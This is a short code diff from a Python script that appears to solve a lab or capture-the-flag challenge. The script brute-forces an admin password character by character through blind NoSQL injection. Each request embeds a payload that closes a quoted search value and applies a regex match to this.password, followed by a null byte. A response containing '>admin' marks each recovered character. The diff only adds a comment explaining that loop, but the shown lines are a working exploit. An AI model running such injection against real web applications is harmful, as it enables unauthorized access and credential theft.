@@ -23,6 +23,7 @@ while True:
     for c in caseset:
         resp = requests.get("http://{}?search=admin%27%20%26%26%20this.password.match(/^{}.*/)%00".format(url,password+c))
         #print("http://{}?search=admin%27%20%26%26%20this.password.match(/^{}.*/)%00".format(url,c))
+        #if >admin is found in the get response, it will add the letter the the password/key, and move to the next available option in the caseset
         if ('>admin' in resp.text):
             password= password + c
             print (password)
